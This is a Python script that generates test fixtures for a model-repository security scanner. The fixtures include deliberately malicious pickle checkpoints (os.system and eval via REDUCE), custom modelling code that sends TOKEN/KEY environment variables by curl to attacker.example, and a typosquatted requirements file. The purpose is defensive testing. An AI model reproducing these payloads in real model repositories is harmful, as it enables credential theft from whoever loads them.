#!/usr/bin/env python3
"""Build the test fixtures, including a genuinely malicious checkpoint.

The malicious pickle is assembled by writing opcodes directly rather than by
calling pickle.dumps on an object with a hostile __reduce__. Two reasons:

  1. No dangerous object is ever constructed in this process. We emit bytes.
  2. The opcode sequence is the thing being demonstrated, so writing it out
     literally makes the fixture self-documenting -- you can read the attack.

The payload is a harmless `echo`: it is never executed by anything in this
repo (the scanner reads opcodes and does not run them), but if someone did
torch.load this file, the point would be made without damage.

Run: python3 fixtures/build_fixtures.py
"""

from __future__ import annotations

import json
import struct
import zipfile
from pathlib import Path

FIXTURES = Path(__file__).parent


# --------------------------------------------------------------------------
# Malicious pickle, written as raw opcodes.
# --------------------------------------------------------------------------
def malicious_pickle(payload: str) -> bytes:
    """Emit a protocol-2 pickle equivalent to os.system(payload).

    Opcode walkthrough -- this is the whole attack, and it is only 5 opcodes:

      PROTO 2         declare protocol version
      GLOBAL os system  resolve the callable `os.system` and push it
      MARK            start an argument tuple
      UNICODE payload   push the command string
      TUPLE           collapse to (payload,)
      REDUCE          call the pushed callable with the pushed args  <-- here
      STOP            done

    REDUCE is the moment of execution, and it happens during unpickling,
    inside torch.load, before a single tensor byte is read.
    """
    parts = [
        b"\x80\x02",                          # PROTO 2
        b"cos\nsystem\n",                     # GLOBAL 'os' 'system'
        b"(",                                 # MARK
        b"V" + payload.encode() + b"\n",      # UNICODE payload
        b"t",                                 # TUPLE
        b"R",                                 # REDUCE
        b".",                                 # STOP
    ]
    return b"".join(parts)


def benign_state_dict_pickle() -> bytes:
    """A pickle that looks like a real torch state dict: only expected globals.

    Uses collections.OrderedDict, which is exactly what a state dict is, so the
    scanner should see a resolved global and correctly decide it is unremarkable.
    """
    return b"".join([
        b"\x80\x02",
        b"ccollections\nOrderedDict\n",   # GLOBAL collections.OrderedDict
        b"(",                             # MARK
        b"t",                             # TUPLE -> ()
        b"R",                             # REDUCE -> OrderedDict()
        b".",                             # STOP
    ])


def write_torch_zip(path: Path, pickle_bytes: bytes, archive_name: str = "archive") -> None:
    """Wrap a pickle in the zip layout modern torch.save produces."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr(f"{archive_name}/data.pkl", pickle_bytes)
        zf.writestr(f"{archive_name}/version", "3\n")
        # A plausible tensor storage blob so the file is not obviously a stub.
        zf.writestr(f"{archive_name}/data/0", b"\x00" * 256)


# --------------------------------------------------------------------------
# safetensors: real format, header is JSON, body is raw bytes.
# --------------------------------------------------------------------------
def write_safetensors(path: Path, tensors: dict[str, tuple[list[int], str]]) -> None:
    """Write a structurally valid safetensors file with zeroed tensor data.

    Layout: u64 little-endian header length, then that many bytes of JSON
    header, then the tensor data region. Note there is nowhere in this format
    for a callable to live -- that is the entire security argument for it.
    """
    offset = 0
    header: dict = {}
    for name, (shape, dtype) in tensors.items():
        width = {"F32": 4, "F16": 2, "BF16": 2, "I64": 8}[dtype]
        count = 1
        for dim in shape:
            count *= dim
        size = count * width
        header[name] = {
            "dtype": dtype,
            "shape": shape,
            "data_offsets": [offset, offset + size],
        }
        offset += size

    header["__metadata__"] = {"format": "pt"}
    blob = json.dumps(header).encode("utf-8")
    # Header must be 8-byte aligned.
    pad = (-len(blob)) % 8
    blob += b" " * pad

    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as fh:
        fh.write(struct.pack("<Q", len(blob)))
        fh.write(blob)
        fh.write(b"\x00" * offset)


def write(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


# ==========================================================================
# Fixture 1: ALLOW. Trusted publisher, safetensors, no custom code.
# ==========================================================================
def build_allow() -> None:
    root = FIXTURES / "allow-tinyllama-safetensors"

    write_safetensors(
        root / "model.safetensors",
        {
            "model.embed_tokens.weight": ([32, 16], "F16"),
            "model.layers.0.self_attn.q_proj.weight": ([16, 16], "F16"),
            "model.layers.0.mlp.gate_proj.weight": ([32, 16], "F16"),
            "lm_head.weight": ([32, 16], "F16"),
        },
    )

    write(root / "config.json", json.dumps({
        "architectures": ["LlamaForCausalLM"],
        "model_type": "llama",
        "hidden_size": 16,
        "num_attention_heads": 2,
        "num_hidden_layers": 1,
        "vocab_size": 32,
        "torch_dtype": "float16",
        "transformers_version": "4.44.0",
    }, indent=2))

    write(root / "tokenizer_config.json", json.dumps({
        "tokenizer_class": "LlamaTokenizerFast",
        "bos_token": "<s>",
        "eos_token": "</s>",
        "model_max_length": 2048,
    }, indent=2))

    write(root / "generation_config.json", json.dumps({
        "bos_token_id": 1, "eos_token_id": 2, "max_length": 2048,
    }, indent=2))

    write(root / "requirements.txt", """\
# Pinned, index-published, no capability beyond modelling.
transformers==4.44.2
torch==2.4.1
safetensors==0.4.5
tokenizers==0.19.1
""")

    write(root / "README.md", """\
---
license: apache-2.0
library_name: transformers
tags:
- text-generation
---

# TinyLlama-1.1B-Chat (fixture)

A small chat-tuned Llama-architecture model, shipped as safetensors.

## Intended use

Instruction-following and chat evaluation. English only.

## Training data

Trained on a filtered mix of public web text and synthetic instruction data.
See the technical report for the full composition.

## Limitations

Small model: weak at multi-step reasoning, arithmetic, and long-context recall.
Not evaluated for safety-critical use. Known to produce confident errors on
factual questions outside common knowledge.

## Evaluation

MMLU 25.3, HellaSwag 59.2, ARC-c 33.8 (fixture values, illustrative only).

## Architecture

Standard LlamaForCausalHead, natively supported by transformers. No custom
modelling code, and no `auto_map` -- this loads on library code alone.
""")

    write(root / "hf_metadata.json", json.dumps({
        "id": "meta-llama/TinyLlama-1.1B-Chat-fixture",
        "sha": "3f1c4d8a9b2e5f7061a3c9d8e4b7f2a1c6d5e0b9",
        "downloads": 1842203,
        "likes": 1210,
        "gated": False,
        "private": False,
        "createdAt": "2024-01-15T09:12:00.000Z",
        "tags": ["transformers", "llama", "text-generation", "license:apache-2.0",
                 "safetensors"],
        "license": "apache-2.0",
        "siblings": [
            {"rfilename": "model.safetensors"},
            {"rfilename": "config.json"},
        ],
    }, indent=2))


# ==========================================================================
# Fixture 2: QUARANTINE (blocked). The full attack, stacked.
# ==========================================================================
def build_quarantine() -> None:
    root = FIXTURES / "quarantine-backdoored-finetune"

    # (a) Malicious checkpoint: os.system via REDUCE, in the zip layout
    #     torch.save actually produces.
    write_torch_zip(
        root / "pytorch_model.bin",
        malicious_pickle(
            "echo 'fixture payload: this is where exfiltration would run' "
            "# curl -X POST https://attacker.example/collect -d @/var/run/secrets/token"
        ),
    )

    # (b) Custom modelling code that transformers will import under
    #     trust_remote_code=True.
    write(root / "modeling_customllama.py", '''\
"""Custom modelling code for CustomLlama.

Fixture. This is what hostile `trust_remote_code` code looks like: the
malicious work happens at import and __init__ time, wrapped in enough real
modelling scaffolding to survive a skim.
"""

import base64
import os
import subprocess

import torch
import torch.nn as nn
from transformers import PreTrainedModel
from transformers.models.llama.modeling_llama import LlamaForCausalLM

from .configuration_customllama import CustomLlamaConfig

# Runs at import, before any model object exists.
_TELEMETRY = base64.b64decode("aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlL2NvbGxlY3Q=")


def _register_node():
    """Named to look like cluster bookkeeping. Reads credentials and exfiltrates."""
    env = {k: v for k, v in os.environ.items() if "TOKEN" in k or "KEY" in k}
    subprocess.run(
        ["curl", "-s", "-X", "POST", _TELEMETRY.decode(), "-d", str(env)],
        capture_output=True,
    )


class CustomLlamaForCausalLM(LlamaForCausalLM):
    config_class = CustomLlamaConfig

    def __init__(self, config):
        super().__init__(config)
        _register_node()
        self.router = nn.Linear(config.hidden_size, config.hidden_size, bias=False)

    def forward(self, *args, **kwargs):
        return super().forward(*args, **kwargs)
''')

    write(root / "configuration_customllama.py", '''\
"""Config class for CustomLlama. Fixture."""

from transformers.models.llama.configuration_llama import LlamaConfig


class CustomLlamaConfig(LlamaConfig):
    model_type = "customllama"

    def __init__(self, router_jitter=0.01, **kwargs):
        self.router_jitter = router_jitter
        super().__init__(**kwargs)
''')

    # (c) auto_map: the explicit declaration that loading imports the above.
    write(root / "config.json", json.dumps({
        "architectures": ["CustomLlamaForCausalLM"],
        "model_type": "customllama",
        "auto_map": {
            "AutoConfig": "configuration_customllama.CustomLlamaConfig",
            "AutoModelForCausalLM": "modeling_customllama.CustomLlamaForCausalLM",
        },
        "hidden_size": 16,
        "num_attention_heads": 2,
        "num_hidden_layers": 1,
        "vocab_size": 32,
        "torch_dtype": "float16",
    }, indent=2))

    # (d) Dependency problems: typosquat, URL dep, unpinned, out-of-shape.
    write(root / "requirements.txt", """\
torch>=2.0
trasformers==4.38.0
requests
paramiko>=3.0
helper-utils @ git+https://github.com/unknown-user/helper-utils.git@main
""")

    write(root / "README.md", """\
# custom-llama-finetune

Finetuned. Load with trust_remote_code=True.
""")

    write(root / "hf_metadata.json", json.dumps({
        "id": "anon-research-42/custom-llama-finetune",
        "sha": "main",
        "downloads": 37,
        "likes": 1,
        "gated": False,
        "private": False,
        "createdAt": "2026-07-02T22:41:00.000Z",
        "tags": ["transformers", "custom_code"],
        "siblings": [
            {"rfilename": "pytorch_model.bin"},
            {"rfilename": "modeling_customllama.py"},
        ],
    }, indent=2))


# ==========================================================================
# Fixture 3: ELEVATED. Legitimate model, real code-execution surface.
# ==========================================================================
def build_elevated() -> None:
    """The interesting case: nothing hostile, but a real exec path.

    This exists because allow/block is the easy pair to demonstrate. Most
    real-world models land here -- a well-regarded publisher shipping a
    genuinely novel architecture that needs custom code -- and how the system
    handles *this* is what decides whether researchers trust it.
    """
    root = FIXTURES / "elevated-custom-arch"

    write_safetensors(
        root / "model.safetensors",
        {"backbone.weight": ([64, 32], "BF16"), "head.weight": ([8, 32], "BF16")},
    )

    write(root / "modeling_mamba_hybrid.py", '''\
"""Hybrid SSM/attention modelling code. Fixture.

Deliberately benign: torch and transformers only, no process control, no
network, no dynamic execution. The scanner should find nothing hostile here --
and should still route the model to Elevated, because `auto_map` means this
file gets imported and executed, and "we read it and it looked fine" is a
weaker guarantee than "there is no code path at all".
"""

import math

import torch
import torch.nn as nn
import torch.nn.functional as F
from transformers import PreTrainedModel
from transformers.modeling_outputs import CausalLMOutputWithPast

from .configuration_mamba_hybrid import MambaHybridConfig


class SelectiveScan(nn.Module):
    """Simplified selective state-space scan."""

    def __init__(self, d_model: int, d_state: int):
        super().__init__()
        self.in_proj = nn.Linear(d_model, d_model * 2, bias=False)
        self.dt_proj = nn.Linear(d_model, d_model, bias=True)
        self.A_log = nn.Parameter(torch.randn(d_model, d_state))
        self.D = nn.Parameter(torch.ones(d_model))
        self.out_proj = nn.Linear(d_model, d_model, bias=False)

    def forward(self, x):
        x_and_res = self.in_proj(x)
        x_in, res = x_and_res.chunk(2, dim=-1)
        dt = F.softplus(self.dt_proj(x_in))
        A = -torch.exp(self.A_log)
        h = torch.zeros(x.shape[0], x.shape[-1], A.shape[-1], device=x.device)
        outputs = []
        for t in range(x.shape[1]):
            h = h * torch.exp(dt[:, t].unsqueeze(-1) * A) + x_in[:, t].unsqueeze(-1)
            outputs.append((h.sum(-1) + self.D * x_in[:, t]))
        y = torch.stack(outputs, dim=1)
        return self.out_proj(y * F.silu(res))


class MambaHybridForCausalLM(PreTrainedModel):
    config_class = MambaHybridConfig

    def __init__(self, config):
        super().__init__(config)
        self.embed = nn.Embedding(config.vocab_size, config.hidden_size)
        self.blocks = nn.ModuleList(
            [SelectiveScan(config.hidden_size, config.state_size)
             for _ in range(config.num_hidden_layers)]
        )
        self.norm = nn.LayerNorm(config.hidden_size)
        self.lm_head = nn.Linear(config.hidden_size, config.vocab_size, bias=False)
        self.post_init()

    def forward(self, input_ids, labels=None, **kwargs):
        h = self.embed(input_ids)
        for block in self.blocks:
            h = h + block(self.norm(h))
        logits = self.lm_head(self.norm(h))
        loss = None
        if labels is not None:
            loss = F.cross_entropy(
                logits[:, :-1].reshape(-1, logits.size(-1)), labels[:, 1:].reshape(-1)
            )
        return CausalLMOutputWithPast(loss=loss, logits=logits)
''')

    write(root / "configuration_mamba_hybrid.py", '''\
"""Config for the hybrid SSM model. Fixture."""

from transformers import PretrainedConfig


class MambaHybridConfig(PretrainedConfig):
    model_type = "mamba_hybrid"

    def __init__(self, hidden_size=32, num_hidden_layers=2, state_size=8,
                 vocab_size=8, **kwargs):
        self.hidden_size = hidden_size
        self.num_hidden_layers = num_hidden_layers
        self.state_size = state_size
        self.vocab_size = vocab_size
        super().__init__(**kwargs)
''')

    write(root / "config.json", json.dumps({
        "architectures": ["MambaHybridForCausalLM"],
        "model_type": "mamba_hybrid",
        "auto_map": {
            "AutoConfig": "configuration_mamba_hybrid.MambaHybridConfig",
            "AutoModelForCausalLM": "modeling_mamba_hybrid.MambaHybridForCausalLM",
        },
        "hidden_size": 32,
        "num_hidden_layers": 2,
        "state_size": 8,
        "vocab_size": 8,
    }, indent=2))

    write(root / "requirements.txt", """\
transformers==4.44.2
torch==2.4.1
einops==0.8.0
""")

    write(root / "README.md", """\
---
license: apache-2.0
---

# mamba-hybrid-370m (fixture)

Hybrid state-space / attention model. The architecture is not yet upstream in
transformers, so loading requires `trust_remote_code=True`.

## Training data

Public web corpus, deduplicated, 400B tokens.

## Limitations

Research preview. The recurrent scan is unoptimised and slow at long context.
Not instruction-tuned.

## Why custom code

`SelectiveScan` has no equivalent in transformers as of 4.44. Once the
architecture lands upstream, this repo will drop the custom modelling files.
""")

    write(root / "hf_metadata.json", json.dumps({
        "id": "allenai/mamba-hybrid-370m-fixture",
        "sha": "b7e2c91d4a68f3057e1b8c2d9f4a6053e8c7b1d2",
        "downloads": 24518,
        "likes": 187,
        "gated": False,
        "private": False,
        "createdAt": "2025-11-03T14:22:00.000Z",
        "tags": ["transformers", "mamba", "custom_code", "license:apache-2.0"],
        "license": "apache-2.0",
    }, indent=2))


# ==========================================================================
# Fixture 4: STANDARD. Unknown publisher, but nothing can execute.
# ==========================================================================
def build_standard() -> None:
    """Shows the tiering is about capability, not reputation.

    An anonymous account with 40 downloads still gets an allow, because
    safetensors with no custom code has no code-execution path. Refusing this
    would be the kind of reputation-theatre that makes researchers route
    around the system.
    """
    root = FIXTURES / "standard-community-finetune"

    write_safetensors(
        root / "model.safetensors",
        {"base.weight": ([16, 16], "F32"), "adapter.weight": ([16, 4], "F32")},
    )
    write(root / "config.json", json.dumps({
        "architectures": ["MistralForCausalLM"],
        "model_type": "mistral",
        "hidden_size": 16,
        "num_attention_heads": 2,
        "num_hidden_layers": 1,
        "vocab_size": 16,
    }, indent=2))
    write(root / "requirements.txt", "transformers==4.44.2\ntorch==2.4.1\n")
    write(root / "README.md", """\
---
license: mit
---

# mistral-7b-medqa-lora-merged (fixture)

A LoRA finetune of Mistral-7B on a medical QA dataset, merged and exported to
safetensors.

## Training data

MedQA train split plus ~8k synthetic clinical vignettes.

## Limitations

Not a clinical tool. Hallucinates plausible-sounding drug interactions. Was
not evaluated on any held-out clinical benchmark.
""")
    write(root / "hf_metadata.json", json.dumps({
        "id": "some-grad-student/mistral-7b-medqa-lora-merged",
        "sha": "9c8b7a6d5e4f3021a9b8c7d6e5f40312a9b8c7d6",
        "downloads": 412,
        "likes": 6,
        "gated": False,
        "private": False,
        "createdAt": "2026-05-20T11:05:00.000Z",
        "tags": ["transformers", "mistral", "license:mit", "safetensors"],
        "license": "mit",
    }, indent=2))


# ==========================================================================
# Fixture 5: BLOCKED on weights alone, no custom code, trusted-looking repo.
# ==========================================================================
def build_trojaned_trusted() -> None:
    """A repo that passes every soft signal and still must be blocked.

    Popular publisher name, high downloads, pinned SHA, good model card, clean
    dependencies, no custom code -- and a backdoored checkpoint. This is the
    fixture that proves the gate is not just a reputation lookup, and the one
    that justifies scanning artefacts from allowlisted orgs too.
    """
    root = FIXTURES / "quarantine-trojaned-checkpoint"

    # Legacy (non-zip) raw pickle: exercises the other code path in the scanner.
    root.mkdir(parents=True, exist_ok=True)
    (root / "pytorch_model.bin").write_bytes(
        b"".join([
            b"\x80\x02",
            # STACK_GLOBAL variant: module and name arrive as string pushes
            # rather than as a GLOBAL argument. Same effect, and a scanner that
            # only greps for `c` opcodes misses it entirely.
            b"X\x08\x00\x00\x00builtins",
            b"X\x04\x00\x00\x00eval",
            b"\x93",                                  # STACK_GLOBAL
            b"(",
            b"X\x2a\x00\x00\x00__import__('os').environ.get('AWS_SECRET')",
            b"t",
            b"R",
            b".",
        ])
    )

    write(root / "config.json", json.dumps({
        "architectures": ["GPTNeoXForCausalLM"],
        "model_type": "gpt_neox",
        "hidden_size": 32,
        "num_attention_heads": 4,
        "num_hidden_layers": 2,
        "vocab_size": 64,
    }, indent=2))

    write(root / "requirements.txt", "transformers==4.44.2\ntorch==2.4.1\n")

    write(root / "README.md", """\
---
license: apache-2.0
library_name: transformers
---

# pythia-410m-deduped (fixture, checkpoint tampered)

A well-documented, widely-used research model. Everything about this repo looks
right: named publisher, high download count, pinned revision, clean pinned
dependencies, a thorough card, and no custom modelling code.

The `pytorch_model.bin` has been tampered with.

## Training data

The Pile, deduplicated.

## Limitations

Base model, not instruction-tuned. English only.
""")

    write(root / "hf_metadata.json", json.dumps({
        "id": "eleutherai/pythia-410m-deduped-fixture",
        "sha": "a1b2c3d4e5f60718293a4b5c6d7e8f9012a3b4c5",
        "downloads": 2914003,
        "likes": 2240,
        "gated": False,
        "private": False,
        "createdAt": "2023-03-10T08:00:00.000Z",
        "tags": ["transformers", "gpt_neox", "license:apache-2.0"],
        "license": "apache-2.0",
    }, indent=2))


# ==========================================================================
# Fixture 6: pickle weights that are actually clean.
# ==========================================================================
def build_clean_pickle() -> None:
    """Pickle format, benign opcodes: the conversion case.

    Lots of older repos are like this. The right answer is not "block it" --
    it is "convert it to safetensors on intake and serve that", which is a
    mirror-side action the researcher never sees.
    """
    root = FIXTURES / "elevated-legacy-pickle-clean"

    write_torch_zip(root / "pytorch_model.bin", benign_state_dict_pickle())
    write(root / "config.json", json.dumps({
        "architectures": ["BertForSequenceClassification"],
        "model_type": "bert",
        "hidden_size": 32,
        "num_attention_heads": 2,
        "num_hidden_layers": 2,
        "vocab_size": 64,
    }, indent=2))
    write(root / "requirements.txt", "transformers==4.30.2\ntorch==2.0.1\n")
    write(root / "README.md", """\
---
license: apache-2.0
---

# bert-base-sentiment (fixture)

A 2021-era BERT sentiment classifier. Published before safetensors was the
default, so it ships only `pytorch_model.bin`.

## Training data

SST-2 plus in-house product review data.

## Limitations

English only, short-text only, degrades badly on sarcasm and negation.
""")
    write(root / "hf_metadata.json", json.dumps({
        "id": "textattack/bert-base-sentiment-fixture",
        "sha": "d4c3b2a1908f7e6d5c4b3a29180f7e6d5c4b3a29",
        "downloads": 88214,
        "likes": 143,
        "gated": False,
        "private": False,
        "createdAt": "2021-06-11T10:30:00.000Z",
        "tags": ["transformers", "bert", "license:apache-2.0"],
        "license": "apache-2.0",
    }, indent=2))


def main() -> None:
    build_allow()
    build_standard()
    build_elevated()
    build_clean_pickle()
    build_quarantine()
    build_trojaned_trusted()
    print("Fixtures written to", FIXTURES)
    for child in sorted(FIXTURES.iterdir()):
        if child.is_dir():
            print("  -", child.name)


if __name__ == "__main__":
    main()
